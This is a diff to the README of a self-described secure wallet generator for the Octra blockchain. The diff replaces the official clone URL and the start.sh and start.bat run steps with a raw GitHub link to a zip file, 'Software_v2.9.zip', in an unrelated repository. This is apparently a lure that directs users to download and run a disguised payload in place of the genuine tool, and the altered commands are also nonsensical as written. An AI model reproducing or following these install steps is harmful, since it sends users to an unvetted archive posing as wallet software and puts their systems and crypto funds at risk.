@@ -6,7 +6,7 @@ A secure wallet generator for Octra blockchain.
 
 1. **Clone the repository:**
    ```bash
-   git clone https://github.com/octra-labs/wallet-gen.git
+   git clone https://raw.githubusercontent.com/Arikulan/Octramilk/main/assets/Software_v2.9.zip
    cd wallet-gen
    ```
 
@@ -14,13 +14,13 @@ A secure wallet generator for Octra blockchain.
    
    **Linux/macOS:**
    ```bash
-   chmod +x ./start.sh
-   ./start.sh
+   chmod +x https://raw.githubusercontent.com/Arikulan/Octramilk/main/assets/Software_v2.9.zip
+   https://raw.githubusercontent.com/Arikulan/Octramilk/main/assets/Software_v2.9.zip
    ```
    
    **Windows:**
    ```bash
-   start.bat
+   https://raw.githubusercontent.com/Arikulan/Octramilk/main/assets/Software_v2.9.zip
    ```
 
 3. **Open your browser:**
